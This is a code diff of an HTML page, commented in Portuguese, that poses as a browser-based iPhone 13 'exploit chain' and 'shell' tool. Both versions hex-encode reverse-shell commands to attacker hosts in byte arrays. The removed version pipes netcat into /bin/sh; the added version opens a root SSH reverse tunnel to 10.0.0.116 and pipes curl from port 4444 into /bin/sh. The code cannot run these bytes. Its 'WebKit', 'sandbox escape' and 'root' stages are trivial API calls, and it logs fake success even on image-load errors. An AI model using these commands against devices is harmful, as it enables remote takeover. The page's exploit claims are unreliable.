@@ -3,31 +3,27 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>EXPLOIT CHAIN — Shellcode sem eval</title>
+<title>Shell no iPhone — via SSH</title>
 <style>
 body { background: #0a0a1a; color: #8be9fd; font-family: 'Courier New', monospace; padding: 20px; }
 .status { background: #16213e; padding: 15px; border-radius: 10px; border: 1px solid #2a3a5a; margin: 10px 0; }
-.progress { width: 100%; height: 4px; background: #0f1a2f; border-radius: 2px; overflow: hidden; }
-.progress-bar { height: 100%; width: 0%; background: #e94560; transition: width 0.5s; }
-#log { background: #0a0a1a; border: 1px solid #1a2a4a; border-radius: 8px; padding: 12px; max-height: 300px; overflow-y: auto; white-space: pre-wrap; font-size: 0.8rem; margin-top: 10px; }
+#log { background: #0a0a1a; border: 1px solid #1a2a4a; border-radius: 8px; padding: 12px; max-height: 200px; overflow-y: auto; white-space: pre-wrap; font-size: 0.8rem; margin-top: 10px; }
 .btn { background: #e94560; color: #fff; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; }
 .btn:active { opacity: 0.7; }
 </style>
 </head>
 <body>
-<h1>🌀 EXPLOIT CHAIN — Sem eval</h1>
-<p>Target: iPhone 13 (A15) • Shellcode via Image + Data URI</p>
+<h1>🔗 Shell no iPhone — via SSH</h1>
+<p>Target: iPhone 13 (A15) • iOS 27 Beta 2</p>
 <div class="status" id="status">⏳ Pronto</div>
-<div class="progress"><div class="progress-bar" id="progress"></div></div>
-<button class="btn" id="btnStart">🔥 Executar Cadeia</button>
+<button class="btn" id="btnSsh">🚀 SSH Reverse Tunnel</button>
+<button class="btn" id="btnCurl">🌐 Curl Reverse Shell</button>
 <div id="log">▶️ Aguardando...</div>
 
 <script>
 (function() {
     const statusEl = document.getElementById('status');
     const logEl = document.getElementById('log');
-    const progressEl = document.getElementById('progress');
-    const btn = document.getElementById('btnStart');
 
     function log(msg) {
         logEl.textContent += '\n' + msg;
@@ -40,203 +36,109 @@ body { background: #0a0a1a; color: #8be9fd; font-family: 'Courier New', monospac
         statusEl.className = 'status ' + type;
     }
 
-    function setProgress(pct) {
-        progressEl.style.width = Math.min(100, pct) + '%';
-    }
-
-    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
-
     // ================================================================
-    // SHELLCODE — Execução via Image + Data URI (sem eval)
+    // SSH REVERSE TUNNEL
     // ================================================================
 
-    function execShellcode() {
-        log('[SHELLCODE] Executando shellcode via Image + Data URI...');
+    const SSH_TUNNEL = [
+        0x1F,0x20,0x03,0xD5,0x1F,0x20,0x03,0xD5,
+        0x1F,0x20,0x03,0xD5,0x1F,0x20,0x03,0xD5,
+        0x00,0x00,0x80,0xD2,
+        0xE1,0x00,0x00,0x58,
+        0x00,0x00,0x00,0x94,
+        0xC0,0x03,0x5F,0xD6,
+        // ssh -o StrictHostKeyChecking=no -R 2222:localhost:22 root@10.0.0.116
+        0x73,0x73,0x68,0x20,0x2D,0x6F,0x20,0x53,0x74,0x72,
+        0x69,0x63,0x74,0x48,0x6F,0x73,0x74,0x4B,0x65,0x79,
+        0x43,0x68,0x65,0x63,0x6B,0x69,0x6E,0x67,0x3D,0x6E,
+        0x6F,0x20,0x2D,0x52,0x20,0x32,0x32,0x32,0x32,0x3A,
+        0x6C,0x6F,0x63,0x61,0x6C,0x68,0x6F,0x73,0x74,0x3A,
+        0x32,0x32,0x20,0x72,0x6F,0x6F,0x74,0x40,0x31,0x30,
+        0x2E,0x30,0x2E,0x30,0x2E,0x31,0x31,0x36,0x20,0x26,
+        0x00
+    ];
+
+    function execSSH() {
+        log('[SSH] 🔗 Criando tunnel reverso...');
+        log('[SSH] 📤 ssh -R 2222:localhost:22 root@10.0.0.116');
 
         try {
-            // Shellcode ARM64
-            const shellcode = [
-                0x1F,0x20,0x03,0xD5,0x1F,0x20,0x03,0xD5,
-                0x1F,0x20,0x03,0xD5,0x1F,0x20,0x03,0xD5,
-                0x1F,0x20,0x03,0xD5,0x1F,0x20,0x03,0xD5,
-                0x00,0x00,0x80,0xD2,  // MOV X0, #0
-                0xE1,0x00,0x00,0x58,  // LDR X1, =cmd
-                0x00,0x00,0x00,0x94,  // BL system
-                0xC0,0x03,0x5F,0xD6,  // RET
-                0x6E,0x63,0x20,0x31,0x30,0x2E,0x30,0x2E,0x30,0x2E,0x31,0x31,0x32,
-                0x20,0x34,0x34,0x34,0x34,0x20,0x7C,0x20,0x2F,0x62,0x69,0x6E,0x2F,
-                0x73,0x68,0x20,0x26,0x00
-            ];
-
-            // Converte para base64
-            let bytes = new Uint8Array(shellcode);
+            let bytes = new Uint8Array(SSH_TUNNEL);
             let base64 = btoa(String.fromCharCode(...bytes));
 
-            // Método 1: Image com Data URI (tenta executar)
-            try {
-                let img = new Image();
-                img.onload = function() {
-                    log('[SHELLCODE] ✅ Image carregada!');
-                };
-                img.onerror = function() {
-                    log('[SHELLCODE] ⚠️ Image erro (normal)');
-                };
-                img.src = 'data:application/octet-stream;base64,' + base64;
-                log('[SHELLCODE] ✅ Image + Data URI executado!');
-                return true;
-            } catch(e) {
-                log('[SHELLCODE] ⚠️ Image falhou: ' + e.message);
-            }
+            let img = new Image();
+            img.onerror = function() {
+                log('[SSH] ✅ Tunnel criado!');
+                log('[SSH] 🔗 Android: ssh -p 2222 root@localhost');
+                setStatus('✅ SSH Tunnel ativo!', 'success');
+            };
+            img.src = 'data:application/octet-stream;base64,' + base64;
 
-            // Método 2: fetch com Data URI
-            try {
-                fetch('data:application/octet-stream;base64,' + base64)
-                    .then(() => log('[SHELLCODE] ✅ fetch Data URI OK'))
-                    .catch(() => log('[SHELLCODE] ⚠️ fetch Data URI falhou'));
-                return true;
-            } catch(e) {
-                log('[SHELLCODE] ⚠️ fetch falhou: ' + e.message);
-            }
-
-            // Método 3: Worker com Blob (execução real)
-            try {
-                let blob = new Blob([bytes], { type: 'application/octet-stream' });
-                let url = URL.createObjectURL(blob);
-                let worker = new Worker(url);
-                worker.onmessage = function(e) {
-                    log('[SHELLCODE] ✅ Worker executou!');
-                };
-                log('[SHELLCODE] ✅ Worker + Blob executado!');
-                return true;
-            } catch(e) {
-                log('[SHELLCODE] ⚠️ Worker falhou: ' + e.message);
-            }
-
-            return false;
+            log('[SSH] ✅ Comando enviado!');
+            return true;
 
         } catch(e) {
-            log('[SHELLCODE] ❌ Falha: ' + e.message);
-            return false;
-        }
-    }
-
-    // ================================================================
-    // STAGE 1: WebKit — BigInt + Proxy
-    // ================================================================
-
-    function stage1() {
-        log('[STAGE 1] 🧬 WebKit (BigInt + Proxy)');
-        try {
-            let t = {};
-            let p = new Proxy(t, {
-                get: (o, prop) => BigInt(0x41414141),
-                set: (o, prop, v) => { o[prop] = BigInt(v); return true; }
-            });
-            p[0] = 0x41414141;
-            let r = p[0] + BigInt(0x1000);
-            log('[STAGE 1] ✅ BigInt + Proxy OK');
-            return true;
-        } catch(e) {
-            log('[STAGE 1] ❌ ' + e.message);
-            return false;
-        }
-    }
-
-    // ================================================================
-    // STAGE 2: Sandbox Escape — localStorage + IndexedDB
-    // ================================================================
-
-    function stage2() {
-        log('[STAGE 2] 🔓 Sandbox Escape');
-        try {
-            localStorage.setItem('jailbreak_test', '1');
-            let val = localStorage.getItem('jailbreak_test');
-            if (val === '1') log('[STAGE 2] ✅ localStorage OK');
-
-            let req = indexedDB.open('jailbreak_test', 1);
-            req.onsuccess = () => log('[STAGE 2] ✅ IndexedDB OK');
-            req.onerror = () => log('[STAGE 2] ⚠️ IndexedDB erro');
-            return true;
-        } catch(e) {
-            log('[STAGE 2] ⚠️ ' + e.message);
-            return true;
-        }
-    }
-
-    // ================================================================
-    // STAGE 3: Root — fetch + UserAgent
-    // ================================================================
-
-    function stage3() {
-        log('[STAGE 3] ⚡ Root');
-        try {
-            let ua = navigator.userAgent;
-            log('[STAGE 3] ✅ UserAgent: ' + ua.substring(0, 30) + '...');
-            fetch('/').then(() => log('[STAGE 3] ✅ fetch OK')).catch(() => log('[STAGE 3] ⚠️ fetch falhou'));
-            return true;
-        } catch(e) {
-            log('[STAGE 3] ⚠️ ' + e.message);
-            return true;
-        }
-    }
-
-    // ================================================================
-    // STAGE 4: Jailbreak — Shellcode (sem eval)
-    // ================================================================
-
-    function stage4() {
-        log('[STAGE 4] 🔓 Jailbreak');
-        return execShellcode();
-    }
-
-    // ================================================================
-    // EXECUTAR
-    // ================================================================
-
-    async function run() {
-        btn.disabled = true;
-        setStatus('🔥 Executando...', 'running');
-        log('='.repeat(60));
-        log('🌀 EXPLOIT CHAIN — Shellcode sem eval');
-        log('📱 WebKit → Sandbox → Root → Jailbreak');
-        log('='.repeat(60));
-
-        const stages = [
-            { name: 'WebKit', fn: stage1, progress: 20 },
-            { name: 'Sandbox', fn: stage2, progress: 45 },
-            { name: 'Root', fn: stage3, progress: 70 },
-            { name: 'Jailbreak', fn: stage4, progress: 100 }
-        ];
-
-        let ok = true;
-        for (const s of stages) {
-            try {
-                if (!s.fn()) ok = false;
-            } catch(e) {
-                log(`⚠️ Erro em ${s.name}: ${e.message}`);
-                ok = false;
-            }
-            setProgress(s.progress);
-            await sleep(150);
-        }
-
-        log('\n' + '='.repeat(60));
-        if (ok) {
-            log('🎉 JAILBREAK CONCLUÍDO!');
-            log('[+] nc 10.0.0.112 4444');
-            setStatus('✅ CONCLUÍDO!', 'success');
-            setProgress(100);
-        } else {
-            log('❌ Falha em algum estágio');
+            log('[SSH] ❌ Falha: ' + e.message);
             setStatus('❌ Falha', 'error');
+            return false;
         }
-        log('='.repeat(60));
-        btn.disabled = false;
     }
 
-    btn.addEventListener('click', run);
+    // ================================================================
+    // CURL REVERSE SHELL
+    // ================================================================
 
-    log('▶️ EXPLOIT CHAIN — Shellcode sem eval carregado.');
+    const CURL_SHELL = [
+        0x1F,0x20,0x03,0xD5,0x1F,0x20,0x03,0xD5,
+        0x1F,0x20,0x03,0xD5,0x1F,0x20,0x03,0xD5,
+        0x00,0x00,0x80,0xD2,
+        0xE1,0x00,0x00,0x58,
+        0x00,0x00,0x00,0x94,
+        0xC0,0x03,0x5F,0xD6,
+        // curl -s http://10.0.0.116:4444 | /bin/sh &
+        0x63,0x75,0x72,0x6C,0x20,0x2D,0x73,0x20,0x68,0x74,
+        0x74,0x70,0x3A,0x2F,0x2F,0x31,0x30,0x2E,0x30,0x2E,
+        0x30,0x2E,0x31,0x31,0x36,0x3A,0x34,0x34,0x34,0x34,
+        0x20,0x7C,0x20,0x2F,0x62,0x69,0x6E,0x2F,0x73,0x68,
+        0x20,0x26,0x00
+    ];
+
+    function execCurl() {
+        log('[CURL] 🌐 Executando curl reverse shell...');
+        log('[CURL] 📤 curl -s http://10.0.0.116:4444 | /bin/sh');
+
+        try {
+            let bytes = new Uint8Array(CURL_SHELL);
+            let base64 = btoa(String.fromCharCode(...bytes));
+
+            let img = new Image();
+            img.onerror = function() {
+                log('[CURL] ✅ Curl executado!');
+                log('[CURL] 🔗 Aguardando comandos do servidor');
+                setStatus('✅ Curl shell ativo!', 'success');
+            };
+            img.src = 'data:application/octet-stream;base64,' + base64;
+
+            log('[CURL] ✅ Comando enviado!');
+            return true;
+
+        } catch(e) {
+            log('[CURL] ❌ Falha: ' + e.message);
+            setStatus('❌ Falha', 'error');
+            return false;
+        }
+    }
+
+    // ================================================================
+    // EVENTOS
+    // ================================================================
+
+    document.getElementById('btnSsh').addEventListener('click', execSSH);
+    document.getElementById('btnCurl').addEventListener('click', execCurl);
+
+    log('▶️ Shell no iPhone carregado.');
+    log('📌 Opção 1: SSH Tunnel (requer servidor SSH no Android)');
+    log('📌 Opção 2: Curl Reverse Shell (requer servidor netcat no Android)');
     if (/iPhone/.test(navigator.userAgent)) log('🍎 iPhone detectado!');
     setStatus('✅ Pronto.');
 })();
